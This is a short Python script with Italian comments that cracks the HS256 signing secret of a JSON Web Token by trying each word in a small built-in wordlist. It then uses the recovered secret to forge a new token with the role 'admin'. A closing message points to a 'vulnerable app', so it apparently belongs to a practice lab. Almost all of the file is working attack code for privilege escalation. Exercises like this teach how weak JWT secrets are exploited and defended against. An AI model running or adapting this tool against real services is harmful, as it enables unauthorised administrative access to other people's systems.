import jwt
import sys

def crack_jwt(token, wordlist_file):
    print(f"[*] Avvio attacco Brute-Force sul token...")
    
    with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
        passwords = f.readlines()

    for password in passwords:
        password = password.strip()
        try:
            # Proviamo a decodificare il token con la password corrente
            # Se jwt.decode non dà errore, la password è giusta!
            jwt.decode(token, password, algorithms=["HS256"])
            print(f"\n[+] PASSWORD TROVATA: {password}")
            return password
        except jwt.InvalidSignatureError:
            # Firma sbagliata, proviamo la prossima
            continue
        except Exception as e:
            continue
            
    print("[-] Password non trovata nella wordlist.")
    return None

def forge_admin_token(secret_key):
    print(f"\n[*] Generazione token ADMIN falsificato con la chiave: {secret_key}")
    payload = {
        "user": "hacker",
        "role": "admin"  # <--- Ecco la modifica illegale!
    }
    # Creiamo un nuovo token valido firmato con la chiave scoperta
    forged_token = jwt.encode(payload, secret_key, algorithm="HS256")
    return forged_token

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 jwt_cracker.py <TUA_STRINGA_TOKEN>")
        sys.exit(1)

    target_token = sys.argv[1]
    
    # Usiamo una wordlist interna per semplicità (nella realtà useresti rockyou.txt)
    # Creiamo un file temporaneo wordlist
    with open("wordlist.txt", "w") as f:
        f.write("password\n123456\nqwerty\nsecret123\nadmin\niloveyou")

    # 1. Cracking
    found_secret = crack_jwt(target_token, "wordlist.txt")

    # 2. Forgery (Falsificazione)
    if found_secret:
        admin_token = forge_admin_token(found_secret)
        print(f"\n[SUCCESS] Token Admin Falsificato:\n{admin_token}")
        print("\n[!] Ora usa questo token nell'app vulnerabile (Opzione 2)!")